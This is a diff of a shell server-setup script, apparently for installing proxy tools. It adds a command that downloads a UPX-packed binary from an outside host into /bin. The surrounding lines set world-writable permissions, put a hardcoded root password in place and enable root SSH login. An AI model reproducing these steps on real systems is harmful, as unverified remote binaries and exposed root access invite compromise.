@@ -36,7 +36,8 @@ sudo wget down.99.tf/proxychainsng/libproxychains4.so -O /lib64/libproxychains4.
 sudo wget down.99.tf/proxychainsng/proxychains4 -O /bin/S
 sudo wget down.99.tf/proxychainsng/proxychains.conf -O /bin/proxychains.conf
 sudo wget down.99.tf/ss-local.upx -O /bin/slocal
-sudo chmod -R 777 /bin/S /bin/slocal
+sudo wget down.99.tf/ss-redir.upx -O /bin/sredir
+sudo chmod -R 777 /bin/S /bin/slocal /bin/sredir
 
 echo root:86E8C9293A458EDF91F02B2C1B613B79 | sudo chpasswd root
 sudo sed -i 's/^.*PermitRootLogin.*/PermitRootLogin yes/g' /etc/ssh/sshd_config;
